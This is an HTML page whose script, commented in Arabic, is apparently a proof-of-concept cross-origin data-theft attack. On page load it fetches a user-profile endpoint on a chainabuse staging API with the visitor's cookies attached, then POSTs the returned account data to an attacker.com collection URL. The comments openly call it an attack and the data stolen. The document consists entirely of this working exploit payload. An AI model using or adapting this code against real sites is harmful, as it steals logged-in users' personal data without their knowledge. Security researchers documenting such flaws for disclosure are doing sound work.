<body>

    <script>
        // عندما تتحميل الصفحة، قم بتنفيذ الهجوم
        window.onload = function() {
            // أرسل طلباً إلى الـ API الحساسة في موقع chainabuse-staging
            fetch('https://api.chainabuse-staging.com/v1/me', {
                method: 'GET',
                credentials: 'include' // هذا هو الجزء الحاسم! يخبر المتصفح بإرسال الكوكيز مع الطلب
            })
            .then(response => response.json())
            .then(userData => {
                // الآن المهاجم يمتلك بيانات المستخدم كاملة!
                console.log("Data stolen:", userData);

                // قم بإرسال البيانات المسروقة إلى خادم المهاجم
                fetch('https://attacker.com/log-stolen-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(userData)
                });
            })
            .catch(error => {
                console.error("Attack failed:", error);
            });
        };
    </script>
